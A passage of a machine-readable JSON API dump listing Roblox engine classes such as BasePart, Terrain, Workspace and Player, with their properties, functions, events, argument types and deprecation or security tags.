Type":"Instance","Name":"playerInstance","Default":"nil"}],"Name":"SetNetworkOwner","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SetNetworkOwnershipAuto","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"breakJoints","tags":["deprecated"],"Class":"BasePart","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"getMass","tags":["deprecated"],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"makeJoints","tags":["deprecated"],"Class":"BasePart","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"NormalId","Name":"normalId","Default":null},{"Type":"int","Name":"deltaAmount","Default":null}],"Name":"resize","tags":["deprecated"],"Class":"BasePart","type":"Function"},{"Arguments":[{"Name":"part","Type":"Instance"}],"Name":"LocalSimulationTouched","tags":["deprecated"],"Class":"BasePart","type":"Event"},{"Arguments":[],"Name":"OutfitChanged","tags":["deprecated"],"Class":"BasePart","type":"Event"},{"Arguments":[{"Name":"otherPart","Type":"Instance"}],"Name":"StoppedTouching","tags":["deprecated"],"Class":"BasePart","type":"Event"},{"Arguments":[{"Name":"otherPart","Type":"Instance"}],"Name":"TouchEnded","tags":[],"Class":"BasePart","type":"Event"},{"Arguments":[{"Name":"otherPart","Type":"Instance"}],"Name":"Touched","tags":[],"Class":"BasePart","type":"Event"},{"Arguments":[{"Name":"otherPart","Type":"Instance"}],"Name":"touched","tags":["deprecated"],"Class":"BasePart","type":"Event"},{"Superclass":"BasePart","type":"Class","Name":"CornerWedgePart","tags":[]},{"Superclass":"BasePart","type":"Class","Name":"FormFactorPart","tags":[]},{"ValueType":"FormFactor","type":"Property","Name":"FormFactor","tags":["deprecated"],"Class":"FormFactorPart"},{"ValueType":"FormFactor","type":"Property","Name":"formFactor","tags":["deprecated","hidden"],"Class":"FormFactorPart"},{"Superclass":"FormFactorPart","type":"Class","Name":"Part","tags":[]},{"ValueType":"PartType","type":"Property","Name":"Shape","tags":[],"Class":"Part"},{"Superclass":"Part","type":"Class","Name":"FlagStand","tags":["deprecated"]},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"FlagStand"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"FlagCaptured","tags":[],"Class":"FlagStand","type":"Event"},{"Superclass":"Part","type":"Class","Name":"Platform","tags":[]},{"Superclass":"Part","type":"Class","Name":"Seat","tags":[]},{"ValueType":"bool","type":"Property","Name":"Disabled","tags":[],"Class":"Seat"},{"ValueType":"Object","type":"Property","Name":"Occupant","tags":["readonly"],"Class":"Seat"},{"Superclass":"Part","type":"Class","Name":"SkateboardPlatform","tags":["deprecated"]},{"ValueType":"Object","type":"Property","Name":"Controller","tags":["readonly"],"Class":"SkateboardPlatform"},{"ValueType":"Object","type":"Property","Name":"ControllingHumanoid","tags":["readonly"],"Class":"SkateboardPlatform"},{"ValueType":"int","type":"Property","Name":"Steer","tags":[],"Class":"SkateboardPlatform"},{"ValueType":"bool","type":"Property","Name":"StickyWheels","tags":[],"Class":"SkateboardPlatform"},{"ValueType":"int","type":"Property","Name":"Throttle","tags":[],"Class":"SkateboardPlatform"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"impulseWorld","Default":null}],"Name":"ApplySpecificImpulse","tags":[],"Class":"SkateboardPlatform","type":"Function"},{"Arguments":[{"Name":"humanoid","Type":"Instance"},{"Name":"skateboardController","Type":"Instance"}],"Name":"Equipped","tags":[],"Class":"SkateboardPlatform","type":"Event"},{"Arguments":[{"Name":"newState","Type":"MoveState"},{"Name":"oldState","Type":"MoveState"}],"Name":"MoveStateChanged","tags":[],"Class":"SkateboardPlatform","type":"Event"},{"Arguments":[{"Name":"humanoid","Type":"Instance"}],"Name":"Unequipped","tags":[],"Class":"SkateboardPlatform","type":"Event"},{"Arguments":[{"Name":"humanoid","Type":"Instance"},{"Name":"skateboardController","Type":"Instance"}],"Name":"equipped","tags":["deprecated"],"Class":"SkateboardPlatform","type":"Event"},{"Arguments":[{"Name":"humanoid","Type":"Instance"}],"Name":"unequipped","tags":["deprecated"],"Class":"SkateboardPlatform","type":"Event"},{"Superclass":"Part","type":"Class","Name":"SpawnLocation","tags":[]},{"ValueType":"bool","type":"Property","Name":"AllowTeamChangeOnTouch","tags":[],"Class":"SpawnLocation"},{"ValueType":"int","type":"Property","Name":"Duration","tags":[],"Class":"SpawnLocation"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"SpawnLocation"},{"ValueType":"bool","type":"Property","Name":"Neutral","tags":[],"Class":"SpawnLocation"},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"SpawnLocation"},{"Superclass":"FormFactorPart","type":"Class","Name":"WedgePart","tags":[]},{"Superclass":"BasePart","type":"Class","Name":"MeshPart","tags":[]},{"ValueType":"Material","type":"Property","Name":"Material","tags":["deprecated","readonly"],"Class":"MeshPart"},{"ValueType":"Content","type":"Property","Name":"TextureID","tags":[],"Class":"MeshPart"},{"Superclass":"BasePart","type":"Class","Name":"ParallelRampPart","tags":["deprecated","notbrowsable"]},{"Superclass":"BasePart","type":"Class","Name":"PartOperation","tags":[]},{"ValueType":"bool","type":"Property","Name":"UsePartColor","tags":[],"Class":"PartOperation"},{"Superclass":"PartOperation","type":"Class","Name":"NegateOperation","tags":[]},{"Superclass":"PartOperation","type":"Class","Name":"UnionOperation","tags":[]},{"Superclass":"BasePart","type":"Class","Name":"PrismPart","tags":["deprecated","notbrowsable"]},{"ValueType":"PrismSides","type":"Property","Name":"Sides","tags":[],"Class":"PrismPart"},{"Superclass":"BasePart","type":"Class","Name":"PyramidPart","tags":["deprecated","notbrowsable"]},{"ValueType":"PyramidSides","type":"Property","Name":"Sides","tags":[],"Class":"PyramidPart"},{"Superclass":"BasePart","type":"Class","Name":"RightAngleRampPart","tags":["deprecated","notbrowsable"]},{"Superclass":"BasePart","type":"Class","Name":"Terrain","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"IsSmooth","tags":["readonly"],"Class":"Terrain"},{"ValueType":"Region3int16","type":"Property","Name":"MaxExtents","tags":["readonly"],"Class":"Terrain"},{"ValueType":"Color3","type":"Property","Name":"WaterColor","tags":[],"Class":"Terrain"},{"ValueType":"float","type":"Property","Name":"WaterTransparency","tags":[],"Class":"Terrain"},{"ValueType":"float","type":"Property","Name":"WaterWaveSize","tags":[],"Class":"Terrain"},{"ValueType":"float","type":"Property","Name":"WaterWaveSpeed","tags":[],"Class":"Terrain"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"AutowedgeCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Region3int16","Name":"region","Default":null}],"Name":"AutowedgeCells","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"CellCenterToWorld","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"CellCornerToWorld","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Clear","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ConvertToSmooth","tags":["PluginSecurity"],"Class":"Terrain","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Region3int16","Name":"region","Default":null}],"Name":"CopyRegion","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"CountCells","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"center","Default":null},{"Type":"float","Name":"radius","Default":null},{"Type":"Material","Name":"material","Default":null}],"Name":"FillBall","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CoordinateFrame","Name":"cframe","Default":null},{"Type":"Vector3","Name":"size","Default":null},{"Type":"Material","Name":"material","Default":null}],"Name":"FillBlock","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"float","Name":"resolution","Default":null},{"Type":"Material","Name":"material","Default":null}],"Name":"FillRegion","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"GetCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"GetWaterCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"region","Default":null},{"Type":"Vector3int16","Name":"corner","Default":null},{"Type":"bool","Name":"pasteEmptyCells","Default":null}],"Name":"PasteRegion","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"float","Name":"resolution","Default":null}],"Name":"ReadVoxels","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null},{"Type":"CellMaterial","Name":"material","Default":null},{"Type":"CellBlock","Name":"block","Default":null},{"Type":"CellOrientation","Name":"orientation","Default":null}],"Name":"SetCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Region3int16","Name":"region","Default":null},{"Type":"CellMaterial","Name":"material","Default":null},{"Type":"CellBlock","Name":"block","Default":null},{"Type":"CellOrientation","Name":"orientation","Default":null}],"Name":"SetCells","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null},{"Type":"WaterForce","Name":"force","Default":null},{"Type":"WaterDirection","Name":"direction","Default":null}],"Name":"SetWaterCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"WorldToCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"WorldToCellPreferEmpty","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"WorldToCellPreferSolid","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"float","Name":"resolution","Default":null},{"Type":"Array","Name":"materials","Default":null},{"Type":"Array","Name":"occupancy","Default":null}],"Name":"WriteVoxels","tags":[],"Class":"Terrain","type":"Function"},{"Superclass":"BasePart","type":"Class","Name":"TrussPart","tags":[]},{"ValueType":"Style","type":"Property","Name":"Style","tags":[],"Class":"TrussPart"},{"Superclass":"BasePart","type":"Class","Name":"VehicleSeat","tags":[]},{"ValueType":"int","type":"Property","Name":"AreHingesDetected","tags":["readonly"],"Class":"VehicleSeat"},{"ValueType":"bool","type":"Property","Name":"Disabled","tags":[],"Class":"VehicleSeat"},{"ValueType":"bool","type":"Property","Name":"HeadsUpDisplay","tags":[],"Class":"VehicleSeat"},{"ValueType":"float","type":"Property","Name":"MaxSpeed","tags":[],"Class":"VehicleSeat"},{"ValueType":"Object","type":"Property","Name":"Occupant","tags":["readonly"],"Class":"VehicleSeat"},{"ValueType":"int","type":"Property","Name":"Steer","tags":[],"Class":"VehicleSeat"},{"ValueType":"int","type":"Property","Name":"Throttle","tags":[],"Class":"VehicleSeat"},{"ValueType":"float","type":"Property","Name":"Torque","tags":[],"Class":"VehicleSeat"},{"ValueType":"float","type":"Property","Name":"TurnSpeed","tags":[],"Class":"VehicleSeat"},{"Superclass":"PVInstance","type":"Class","Name":"Model","tags":[]},{"ValueType":"Object","type":"Property","Name":"PrimaryPart","tags":[],"Class":"Model"},{"ReturnType":"void","Arguments":[],"Name":"BreakJoints","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetExtentsSize","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[],"Name":"GetModelCFrame","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetModelSize","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[],"Name":"GetPrimaryPartCFrame","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"MakeJoints","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"MoveTo","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ResetOrientationToIdentity","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SetIdentityOrientation","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CoordinateFrame","Name":"cframe","Default":null}],"Name":"SetPrimaryPartCFrame","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"delta","Default":null}],"Name":"TranslateBy","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"breakJoints","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"makeJoints","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"location","Default":null}],"Name":"move","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"location","Default":null}],"Name":"moveTo","tags":["deprecated"],"Class":"Model","type":"Function"},{"Superclass":"Model","type":"Class","Name":"RootInstance","tags":["notbrowsable"]},{"Superclass":"RootInstance","type":"Class","Name":"Workspace","tags":[]},{"ValueType":"bool","type":"Property","Name":"AllowThirdPartySales","tags":[],"Class":"Workspace"},{"ValueType":"Object","type":"Property","Name":"CurrentCamera","tags":[],"Class":"Workspace"},{"ValueType":"double","type":"Property","Name":"DistributedGameTime","tags":[],"Class":"Workspace"},{"ValueType":"bool","type":"Property","Name":"FilteringEnabled","tags":[],"Class":"Workspace"},{"ValueType":"float","type":"Property","Name":"Gravity","tags":[],"Class":"Workspace"},{"ValueType":"bool","type":"Property","Name":"StreamingEnabled","tags":[],"Class":"Workspace"},{"ValueType":"Object","type":"Property","Name":"Terrain","tags":["readonly"],"Class":"Workspace"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"BreakJoints","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"ExperimentalSolverIsEnabled","tags":["LocalUserSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Ray","Name":"ray","Default":null},{"Type":"Instance","Name":"ignoreDescendentsInstance","Default":"nil"},{"Type":"bool","Name":"terrainCellsAreCubes","Default":"false"},{"Type":"bool","Name":"ignoreWater","Default":"false"}],"Name":"FindPartOnRay","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Ray","Name":"ray","Default":null},{"Type":"Objects","Name":"ignoreDescendentsTable","Default":null},{"Type":"bool","Name":"terrainCellsAreCubes","Default":"false"},{"Type":"bool","Name":"ignoreWater","Default":"false"}],"Name":"FindPartOnRayWithIgnoreList","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Instance","Name":"ignoreDescendentsInstance","Default":"nil"},{"Type":"int","Name":"maxParts","Default":"20"}],"Name":"FindPartsInRegion3","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Objects","Name":"ignoreDescendentsTable","Default":null},{"Type":"int","Name":"maxParts","Default":"20"}],"Name":"FindPartsInRegion3WithIgnoreList","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetNumAwakeParts","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetPhysicsAnalyzerBreakOnIssue","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"int","Name":"index","Default":null}],"Name":"GetPhysicsAnalyzerIssue","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetPhysicsThrottling","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetRealPhysicsFPS","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Instance","Name":"ignoreDescendentsInstance","Default":"nil"}],"Name":"IsRegion3Empty","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Objects","Name":"ignoreDescendentsTable","Default":null}],"Name":"IsRegion3EmptyWithIgnoreList","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"objects","Default":null},{"Type":"JointCreationMode","Name":"jointType","Default":null}],"Name":"JoinToOutsiders","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"MakeJoints","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"PGSIsEnabled","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enable","Default":null}],"Name":"SetPhysicsAnalyzerBreakOnIssue","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetPhysicsThrottleEnabled","tags":["LocalUserSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"UnjoinFromOutsiders","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ZoomToExtents","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Ray","Name":"ray","Default":null},{"Type":"Instance","Name":"ignoreDescendentsInstance","Default":"nil"},{"Type":"bool","Name":"terrainCellsAreCubes","Default":"false"},{"Type":"bool","Name":"ignoreWater","Default":"false"}],"Name":"findPartOnRay","tags":["deprecated"],"Class":"Workspace","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Instance","Name":"ignoreDescendentsInstance","Default":"nil"},{"Type":"int","Name":"maxParts","Default":"20"}],"Name":"findPartsInRegion3","tags":["deprecated"],"Class":"Workspace","type":"Function"},{"Arguments":[{"Name":"count","Type":"int"}],"Name":"PhysicsAnalyzerIssuesFound","tags":["PluginSecurity"],"Class":"Workspace","type":"Event"},{"Superclass":"Model","type":"Class","Name":"Status","tags":["deprecated","notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"Pages","tags":[]},{"ValueType":"bool","type":"Property","Name":"IsFinished","tags":["readonly"],"Class":"Pages"},{"ReturnType":"Array","Arguments":[],"Name":"GetCurrentPage","tags":[],"Class":"Pages","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"AdvanceToNextPageAsync","tags":[],"Class":"Pages","type":"YieldFunction"},{"Superclass":"Pages","type":"Class","Name":"DataStorePages","tags":[]},{"Superclass":"Pages","type":"Class","Name":"FriendPages","tags":[]},{"Superclass":"Pages","type":"Class","Name":"StandardPages","tags":[]},{"Superclass":"Instance","type":"Class","Name":"PartOperationAsset","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ParticleEmitter","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Acceleration","tags":[],"Class":"ParticleEmitter"},{"ValueType":"ColorSequence","type":"Property","Name":"Color","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"Drag","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NormalId","type":"Property","Name":"EmissionDirection","tags":[],"Class":"ParticleEmitter"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberRange","type":"Property","Name":"Lifetime","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"LightEmission","tags":[],"Class":"ParticleEmitter"},{"ValueType":"bool","type":"Property","Name":"LockedToPart","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"Rate","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberRange","type":"Property","Name":"RotSpeed","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberRange","type":"Property","Name":"Rotation","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberSequence","type":"Property","Name":"Size","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberRange","type":"Property","Name":"Speed","tags":[],"Class":"ParticleEmitter"},{"ValueType":"Content","type":"Property","Name":"Texture","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberSequence","type":"Property","Name":"Transparency","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"VelocityInheritance","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"VelocitySpread","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"ZOffset","tags":[],"Class":"ParticleEmitter"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"particleCount","Default":"16"}],"Name":"Emit","tags":[],"Class":"ParticleEmitter","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Path","tags":[]},{"ValueType":"PathStatus","type":"Property","Name":"Status","tags":["readonly"],"Class":"Path"},{"ReturnType":"Array","Arguments":[],"Name":"GetPointCoordinates","tags":[],"Class":"Path","type":"Function"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"start","Default":null}],"Name":"CheckOcclusionAsync","tags":[],"Class":"Path","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"PathfindingService","tags":["notCreatable"]},{"ValueType":"float","type":"Property","Name":"EmptyCutoff","tags":[],"Class":"PathfindingService"},{"ReturnType":"Instance","Arguments":[{"Type":"Vector3","Name":"start","Default":null},{"Type":"Vector3","Name":"finish","Default":null},{"Type":"float","Name":"maxDistance","Default":null}],"Name":"ComputeRawPathAsync","tags":[],"Class":"PathfindingService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"Vector3","Name":"start","Default":null},{"Type":"Vector3","Name":"finish","Default":null},{"Type":"float","Name":"maxDistance","Default":null}],"Name":"ComputeSmoothPathAsync","tags":[],"Class":"PathfindingService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"PersonalServerService","tags":[]},{"ValueType":"string","type":"Property","Name":"RoleSets","tags":["RobloxScriptSecurity"],"Class":"PersonalServerService"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"Demote","tags":["RobloxScriptSecurity"],"Class":"PersonalServerService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"Promote","tags":["RobloxScriptSecurity"],"Class":"PersonalServerService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"personalServerGetRankUrl","Default":null}],"Name":"SetPersonalServerGetRankUrl","tags":["LocalUserSecurity"],"Class":"PersonalServerService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"personalServerRoleSetsUrl","Default":null}],"Name":"SetPersonalServerRoleSetsUrl","tags":["LocalUserSecurity"],"Class":"PersonalServerService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"personalServerSetRankUrl","Default":null}],"Name":"SetPersonalServerSetRankUrl","tags":["LocalUserSecurity"],"Class":"PersonalServerService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"GetRoleSets","tags":["RobloxScriptSecurity"],"Class":"PersonalServerService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"PhysicsPacketCache","tags":[]},{"Superclass":"Instance","type":"Class","Name":"PhysicsService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"PhysicsSettings","tags":[]},{"ValueType":"bool","type":"Property","Name":"AllowSleep","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreAnchorsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreAssembliesShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreAttachmentsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreAwakePartsHighlighted","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreBodyTypesShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreConstraintsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreContactPointsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreJointCoordinatesShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreMechanismsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreModelCoordsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreOwnersShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"ArePartCoordsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreRegionsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreUnalignedPartsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreWorldCoordsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"IsReceiveAgeShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"IsTreeShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"ParallelPhysics","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"PhysicsAnalyzerEnabled","tags":["PluginSecurity","readonly"],"Class":"PhysicsSettings"},{"ValueType":"EnviromentalPhysicsThrottle","type":"Property","Name":"PhysicsEnvironmentalThrottle","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"ShowDecompositionGeometry","tags":[],"Class":"PhysicsSettings"},{"ValueType":"double","type":"Property","Name":"ThrottleAdjustTime","tags":[],"Class":"PhysicsSettings"},{"Superclass":"Instance","type":"Class","Name":"Player","tags":[]},{"ValueType":"int","type":"Property","Name":"AccountAge","tags":["readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"AppearanceDidLoad","tags":["RobloxScriptSecurity","deprecated","readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"AutoJumpEnabled","tags":[],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"CameraMaxZoomDistance","tags":[],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"CameraMinZoomDistance","tags":[],"Class":"Player"},{"ValueType":"CameraMode","type":"Property","Name":"CameraMode","tags":[],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"CanLoadCharacterAppearance","tags":[],"Class":"Player"},{"ValueType":"Object","type":"Property","Name":"Character","tags":[],"Class":"Player"},{"ValueType":"string","type":"Property","Name":"CharacterAppearance","tags":["notbrowsable"],"Class":"Player"},{"ValueType":"ChatMode","type":"Property","Name":"ChatMode","tags":["RobloxScriptSecurity","readonly"],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"DataComplexity","tags":["readonly"],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"DataComplexityLimit","tags":["LocalUserSecurity"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"DataReady","tags":["readonly"],"Class":"Player"},{"ValueType":"DevCameraOcclusionMode","type":"Property","Name":"DevCameraOcclusionMode","tags":[],"Class":"Player"},{"ValueType":"DevComputerCameraMovementMode","type":"Property","Name":"DevComputerCameraMode","tags":[],"Class":"Player"},{"ValueType":"DevComputerMovementMode","type":"Property","Name":"DevComputerMovementMode","tags":[],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"DevEnableMouseLock","tags":[],"Class":"Player"},{"ValueType":"DevTouchCameraMovementMode","type":"Property","Name":"DevTouchCameraMode","tags":[],"Class":"Player"},{"ValueType":"DevTouchMovementMode","type":"Property","Name":"DevTouchMovementMode","tags":[],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"FollowUserId","tags":["readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"Guest","tags":["RobloxScriptSecurity","readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"HasBuildTools","tags":["RobloxScriptSecurity"],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"HealthDisplayDistance","tags":[],"Class":"Player"},{"Value